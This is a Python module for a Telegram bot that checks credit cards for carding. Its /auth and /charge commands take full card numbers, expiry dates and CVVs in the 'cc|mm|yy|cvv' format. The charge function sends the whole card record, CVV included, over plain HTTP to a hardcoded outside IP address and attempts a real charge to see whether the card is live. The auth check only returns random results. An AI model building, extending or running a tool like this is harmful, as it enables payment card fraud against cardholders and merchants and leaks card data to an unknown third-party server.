# CC Checker Module
# Features: Auth & Charge checking for credit cards

import asyncio
import random
import logging
from datetime import datetime
from telegram import Update
from telegram.ext import ContextTypes
import aiohttp

logger = logging.getLogger(__name__)

# User database functions (imported from main)
from helpers import notify_admin

class CCChecker:
    def __init__(self, bot_instance):
        self.bot = bot_instance
        self.user_cooldown = {}
        self.COOLDOWN_SECONDS = 15
        
    async def check_cooldown(self, user_id):
        """Check if user is on cooldown"""
        import time
        if user_id in self.user_cooldown:
            elapsed = time.time() - self.user_cooldown[user_id]
            if elapsed < self.COOLDOWN_SECONDS:
                remaining = int(self.COOLDOWN_SECONDS - elapsed)
                return False, remaining
        self.user_cooldown[user_id] = time.time()
        return True, 0
    
    async def auth_check(self, cc_data):
        """Perform auth check on credit card"""
        # Placeholder for actual auth checking logic
        # This would integrate with payment gateways
        await asyncio.sleep(random.uniform(1, 3))
        
        status = random.choice(['APPROVED', 'DECLINED', 'CCN'])
        response = {
            'status': status,
            'message': 'Auth check completed',
            'timestamp': datetime.now().isoformat()
        }
        return response
    
    async def charge_check(self, cc_data, amount=1.0):
        """Perform charge check on credit card using Stripe API"""
        try:
            # Format CC data for API
            cc_string = f"{cc_data['number']}|{cc_data['month']}|{cc_data['year']}|{cc_data['cvv']}"
            
            # API endpoint
            api_url = f"http://15.204.130.9:6969/check?cc={cc_string}"
            
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                    if resp.status == 200:
                        result = await resp.json()
                        
                        # Parse API response
                        if result.get('success') or result.get('status') == 'success' or 'approved' in str(result).lower():
                            return {
                                'status': 'CHARGED',
                                'amount': amount,
                                'message': result.get('message', 'Charge successful'),
                                'response': result.get('response', 'Approved'),
                                'gateway': 'Stripe',
                                'timestamp': datetime.now().isoformat()
                            }
                        else:
                            return {
                                'status': 'DECLINED',
                                'amount': amount,
                                'message': result.get('message', 'Card declined'),
                                'response': result.get('response', 'Declined'),
                                'gateway': 'Stripe',
                                'timestamp': datetime.now().isoformat()
                            }
                    else:
                        # API returned error status
                        return {
                            'status': 'ERROR',
                            'amount': amount,
                            'message': f'API error: {resp.status}',
                            'timestamp': datetime.now().isoformat()
                        }
        except asyncio.TimeoutError:
            return {
                'status': 'TIMEOUT',
                'amount': amount,
                'message': 'API request timeout',
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            logger.error(f"Charge check API error: {e}")
            return {
                'status': 'ERROR',
                'amount': amount,
                'message': f'Error: {str(e)}',
                'timestamp': datetime.now().isoformat()
            }
    
    def parse_cc_format(self, cc_string):
        """Parse CC format: 1234567890123456|12|2025|123"""
        try:
            parts = cc_string.strip().split('|')
            if len(parts) != 4:
                return None
            
            return {
                'number': parts[0],
                'month': parts[1],
                'year': parts[2],
                'cvv': parts[3]
            }
        except Exception:
            return None

async def cmd_auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Auth check command"""
    user = update.effective_user
    msg = update.message
    
    if not msg.text or len(msg.text.split()) < 2:
        await msg.reply_text(
            "📋 <b>CC Auth Checker</b>\n\n"
            "Usage: /auth <cc>|<mm>|<yy>|<cvv>\n"
            "Example: /auth 4532015112830366|12|2025|123\n\n"
            "✅ Checks card validity without charging",
            parse_mode='HTML'
        )
        return
    
    checker = CCChecker(context.bot)
    
    # Check cooldown
    can_proceed, remaining = await checker.check_cooldown(user.id)
    if not can_proceed:
        await msg.reply_text(f"⏳ Please wait {remaining}s before next check")
        return
    
    cc_string = msg.text.split(maxsplit=1)[1]
    cc_data = checker.parse_cc_format(cc_string)
    
    if not cc_data:
        await msg.reply_text("❌ Invalid format. Use: 1234567890123456|12|2025|123")
        return
    
    status_msg = await msg.reply_text("⏳ Checking card...")
    
    try:
        result = await checker.auth_check(cc_data)
        
        if result['status'] == 'APPROVED':
            response = f"✅ <b>AUTH APPROVED</b>\n\n"
        else:
            response = f"❌ <b>AUTH DECLINED</b>\n\n"
        
        response += f"Card: <code>{cc_data['number'][:6]}••••{cc_data['number'][-4:]}</code>\n"
        response += f"Status: {result['status']}\n"
        response += f"Time: {datetime.now().strftime('%H:%M:%S')}"
        
        await status_msg.edit_text(response, parse_mode='HTML')
        
    except Exception as e:
        logger.error(f"Auth check error: {e}")
        await status_msg.edit_text(f"❌ Check failed: {str(e)}")

async def cmd_charge(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Charge check command"""
    user = update.effective_user
    msg = update.message
    
    if not msg.text or len(msg.text.split()) < 2:
        await msg.reply_text(
            "💳 <b>CC Charge Checker</b>\n\n"
            "Usage: /charge <cc>|<mm>|<yy>|<cvv> [amount]\n"
            "Example: /charge 4532015112830366|12|2025|123 1.00\n\n"
            "⚠️ Attempts a real charge on the card",
            parse_mode='HTML'
        )
        return
    
    checker = CCChecker(context.bot)
    
    # Check cooldown
    can_proceed, remaining = await checker.check_cooldown(user.id)
    if not can_proceed:
        await msg.reply_text(f"⏳ Please wait {remaining}s before next check")
        return
    
    parts = msg.text.split()
    cc_string = parts[1]
    amount = float(parts[2]) if len(parts) > 2 else 1.0
    
    cc_data = checker.parse_cc_format(cc_string)
    
    if not cc_data:
        await msg.reply_text("❌ Invalid format. Use: 1234567890123456|12|2025|123")
        return
    
    status_msg = await msg.reply_text(f"⏳ Charging ${amount:.2f}...")
    
    try:
        result = await checker.charge_check(cc_data, amount)
        
        if result['status'] == 'CHARGED':
            response = f"✅ <b>CHARGE SUCCESS</b>\n\n"
            response += f"💳 Card: <code>{cc_data['number'][:6]}••••{cc_data['number'][-4:]}</code>\n"
            response += f"💰 Amount: ${amount:.2f}\n"
            response += f"🏦 Gateway: {result.get('gateway', 'Stripe')}\n"
            response += f"📝 Response: {result.get('response', 'Approved')}\n"
            response += f"✅ Status: {result['status']}\n"
            response += f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}"
        elif result['status'] == 'DECLINED':
            response = f"❌ <b>CHARGE DECLINED</b>\n\n"
            response += f"💳 Card: <code>{cc_data['number'][:6]}••••{cc_data['number'][-4:]}</code>\n"
            response += f"💰 Amount: ${amount:.2f}\n"
            response += f"🏦 Gateway: {result.get('gateway', 'Stripe')}\n"
            response += f"📝 Response: {result.get('response', 'Declined')}\n"
            response += f"❌ Status: {result['status']}\n"
            response += f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}"
        elif result['status'] == 'TIMEOUT':
            response = f"⏱️ <b>REQUEST TIMEOUT</b>\n\n"
            response += f"💳 Card: <code>{cc_data['number'][:6]}••••{cc_data['number'][-4:]}</code>\n"
            response += f"⚠️ Message: API timeout - try again\n"
            response += f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}"
        else:
            response = f"⚠️ <b>CHECK ERROR</b>\n\n"
            response += f"💳 Card: <code>{cc_data['number'][:6]}••••{cc_data['number'][-4:]}</code>\n"
            response += f"❌ Message: {result.get('message', 'Unknown error')}\n"
            response += f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}"
        
        await status_msg.edit_text(response, parse_mode='HTML')
        
    except Exception as e:
        logger.error(f"Charge check error: {e}")
        await status_msg.edit_text(f"❌ Check failed: {str(e)}")

def register_cc_checker_handlers(application):
    """Register all CC checker command handlers"""
    from telegram.ext import CommandHandler
    
    application.add_handler(CommandHandler("auth", cmd_auth))
    application.add_handler(CommandHandler("charge", cmd_charge))
    
    logger.info("✅ CC Checker handlers registered")
